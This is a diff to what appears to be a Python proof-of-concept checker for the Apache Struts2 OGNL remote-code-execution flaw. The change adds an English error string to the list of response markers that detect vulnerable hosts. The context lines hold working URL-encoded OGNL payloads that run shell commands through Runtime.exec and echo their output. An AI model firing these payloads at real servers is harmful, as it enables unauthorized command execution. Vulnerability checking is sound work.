@@ -12,7 +12,8 @@ def poc(url):
     ran_b = random.randint(1000000, 2000000)
     ran_check = ran_a - ran_b
     lin = 'expr' + ' ' + str(ran_a) + ' - ' + str(ran_b)
-    check = [ran_check, '无法初始化设备 PRN', '??????? PRN', '\Struts2-vuln-Goop', '/Struts2-vuln-Goop']
+    check = [ran_check, '无法初始化设备 PRN', '??????? PRN', '\Struts2-vuln-Goop', '/Struts2-vuln-Goop',
+             'Unable to initialize device PRN']
     poc_goop = [
         r"/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=7556&command=print goop",
         r"/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=7556&command=" + lin + ""
